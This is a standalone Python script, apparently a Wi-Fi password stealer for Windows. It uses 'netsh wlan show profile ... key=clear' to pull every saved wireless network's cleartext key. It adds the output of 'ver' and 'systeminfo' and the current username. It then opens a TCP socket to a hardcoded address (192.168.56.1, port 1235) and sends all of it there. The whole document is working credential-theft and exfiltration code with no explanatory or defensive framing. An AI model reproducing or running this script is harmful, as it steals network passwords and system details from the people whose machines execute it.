ip='192.168.56.1'
port=1235
import socket,getpass,time,socket
import subprocess
x=subprocess.check_output(["netsh","wlan","show","profile"])
x=x.decode("utf-8")
y=x.split("User profiles")

a=y[-1]

a=a.replace("-------------","")

l=a.split("All User Profile     :")

usrlst=[]
passlst=[]
for x in l:
    x=x.strip()
    usrlst.append(x)
    

msg=""
for y in range(1,len(usrlst)):
    try:
        t=usrlst[y]
        x=subprocess.check_output(["netsh","wlan","show","profile",t,"key=clear"])
        x=x.decode("utf-8")
        
        x=x.split("Key Content            :")
        
        
        x=x[1]
        x=x.split("\r")
        p=x[0]
        text=f"'{t}' = '{p}'"
       # print(f"{t} = {p}")
        passlst.append(text)
        
    except:
        text=f"'{t}' = '<null>'"
        passlst.append(text)
       
for i in passlst:
    msg+=i+"\n"
x1=subprocess.check_output(["ver"],shell=True)
x2=subprocess.check_output(["systeminfo"],shell=True,timeout=100)
x1=x1.decode("utf-8")
x2=x2.decode("utf-8")    
msg=msg+"\n"+x1+"\n"+x2

print(msg)

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

sock.connect((ip,port))


print("test 1")
t=f"pc username: {getpass.getuser()}\n_______________________________________________________\npassword list>>>\n{msg}"
sock.send(t.encode("utf-8"))
time.sleep(1)
sock.send("#end#".encode("utf-8"))
x=sock.recv(1024).decode("utf-8")
print(f"x is {x}")    
    
time.sleep(10)
sock.close()
    
    

del sock

